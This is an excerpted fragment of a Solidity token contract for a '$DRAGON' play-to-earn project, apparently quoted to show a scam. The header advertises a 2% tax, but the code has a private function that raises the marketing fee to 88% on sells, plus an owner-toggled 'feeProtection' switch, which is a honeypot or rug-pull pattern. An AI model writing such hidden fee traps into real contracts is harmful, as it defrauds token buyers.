...
/*
    ...
    A well-built P2E game inspired by the western dragon myth, featuring different powerful dragon NFTs and legendary kings.
    2% low tax token.

    Telegram: https://t.me/dragonp2eofficial
    Website: https://bscdragon.org
    Twitter: https://twitter.com/DragonP2E
*/
...
contract Dragon is IERC20, Ownable {
    ...
    string _name = "Dragon";
    string _symbol = "$DRAGON";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 200_000_000_000_000_00 * (10 ** _decimals);
    ...
    uint prevmarketingFee = 2;

    bool public feeProtection = false;
    ...
    function changeSellingFee() private {
        liquidityFee = 0;
        reflectionFee = 0;
        marketingFee = 88;
        giveawayFee = 0;
    ...
    function setFeeProtection(bool _enabled) external {
        require(isTxLimitExempt[msg.sender]);
        feeProtection = _enabled;
    }
